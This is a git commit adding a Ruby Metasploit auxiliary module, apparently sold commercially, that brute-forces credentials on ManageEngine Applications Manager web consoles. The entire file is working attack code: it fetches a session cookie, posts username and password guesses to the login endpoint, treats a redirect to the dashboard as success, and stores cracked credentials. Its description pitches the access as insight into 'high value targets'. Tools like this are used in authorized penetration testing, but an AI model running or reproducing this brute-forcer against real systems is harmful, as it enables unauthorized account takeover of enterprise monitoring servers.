4ca57c8b2e55225de10a1ccf93bab5050ef25df9
Brandon Perry <bperry.volatile@gmail.com>
2017-11-07 17:57:00 -0600

    manageengine apps manager scanner and bruteforce

---
+++ modules/auxiliary/bruteforce/manageengine_apps_manager_bruteforce.rb
@@ -0,0 +1,157 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+require 'metasploit/framework/credential_collection'
+require 'metasploit/framework/login_scanner/http'
+
+module Metasploit
+  module Framework
+    module LoginScanner
+      class ManageEngineAppsManager < ::Metasploit::Framework::LoginScanner::HTTP
+        def attempt_login(credential)
+          result_opts = {
+            credential: credential,
+            host: host,
+            port: port,
+            protocol: 'tcp',
+            #service_name: 'http'
+          }
+
+          begin
+            cli = Rex::Proto::Http::Client.new(host, port, {'Msf'=>framework,'MsfExploit'=>framework_module},ssl,ssl_version,proxies,http_username,http_password)
+            configure_http_client(cli)
+            cli.connect
+
+            req = cli.request_cgi({
+              'uri' => uri + (uri[-1] == '/' ? '' : '/') + 'MyPage.do?method=viewDashBoard&toredirect=true',
+            })
+
+            res = cli.send_recv(req)
+
+            cookie = res.get_cookies
+
+            req = cli.request_cgi({
+              'uri' => uri + (uri[-1] == '/' ? '' : '/') + 'j_security_check',
+              'method' => 'POST',
+              'cookie' => cookie,
+              'vars_post' => {
+                'clienttype' => 'html',
+                'webstart' => '',
+                'j_username' => credential.public,
+                'ScreenWidth' => 1280,
+                'ScreenHeight' => 709,
+                'username' => credential.public,
+                'j_password' => credential.private,
+                'submit' => 'Login'
+              }
+            })
+
+            res = cli.send_recv(req)
+
+            if res && res.code == 302 && res.headers['Location'] =~ /method=viewDashBoard/
+              result_opts.merge!(status: ::Metasploit::Model::Login::Status::SUCCESSFUL, proof: res)
+            else
+              result_opts.merge!(status: ::Metasploit::Model::Login::Status::INCORRECT, proof: res)
+            end
+          rescue Exception => e
+            result_opts.merge!(status: ::Metasploit::Model::Login::Status::UNABLE_TO_CONNECT, proof:e)
+          end
+
+          ::Metasploit::Framework::LoginScanner::Result.new(result_opts)
+        end
+      end
+    end
+  end
+end
+
+
+class MetasploitModule < Msf::Auxiliary
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Report
+  include Msf::Auxiliary::AuthBrute
+  include Msf::Auxiliary::Scanner
+
+  def initialize
+    super(
+        'Name'           => 'ManageEngine Applications Manager Bruteforce',
+        'Description'    => %q(
+        This module attempts to brute force weak credentials on a ManageEngine Applicationa Manager instance.
+
+        ManageEngine Applications Manager is an enterprise solution for managing and monitoring a diverse
+        set of other enterprise solutions ranging from databases to web servers. Privileged access
+        could yield significant insight into high value targets on the network. Tested on version 13.
+
+        Categories: Enterprise
+
+        Price: 2
+
+        Video: https://asciinema.org/a/FESImeHr8eWKD7TrXoVNUQWRE
+
+        OS: Multi
+
+        Arch: Multi
+
+        Requirements: Metasploit Framework
+      ),
+        'Author'         =>
+          [
+          ],
+        'License'        => 'VolatileMinds',
+        'References'     =>
+          [
+          ],
+        'DefaultOptions' => {
+            'RPORT'           => 9090,
+            'STOP_ON_SUCCESS' => true
+        }
+    )
+  end
+
+  def run_host(ip)
+    cred_collection = ::Metasploit::Framework::CredentialCollection.new(
+      blank_passwords: datastore['BLANK_PASSWORDS'],
+      pass_file: datastore['PASS_FILE'],
+      password: datastore['PASSWORD'],
+      user_file: datastore['USER_FILE'],
+      userpass_file: datastore['USERPASS_FILE'],
+      username: datastore['USERNAME'],
+      user_as_pass: datastore['USER_AS_PASS']
+    )
+
+    scanner = Metasploit::Framework::LoginScanner::ManageEngineAppsManager.new(
+      configure_http_login_scanner(
+        host: ip,
+        port: datastore['RPORT'],
+        uri: datastore['TARGETURI'],
+        cred_details: cred_collection,
+        stop_on_success: datastore['STOP_ON_SUCCESS'],
+        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
+        connection_timeout: 5,
+        http_username: datastore['HttpUsername'],
+        http_password: datastore['HttpPassword'],
+      )
+    )
+
+    scanner.scan! do |result|
+      creds = result.to_h
+      creds.merge!(
+        module_fullname: fullname,
+        workspace_id: myworkspace_id
+      )
+
+      if result.success?
+        credcore = create_credential(creds)
+        creds[:core] = credcore
+        create_credential_login(creds)
+        print_good("#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential}")
+      else
+        invalidate_login(creds)
+        vprint_error("#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status})")
+      end
+    end
+  end
+end
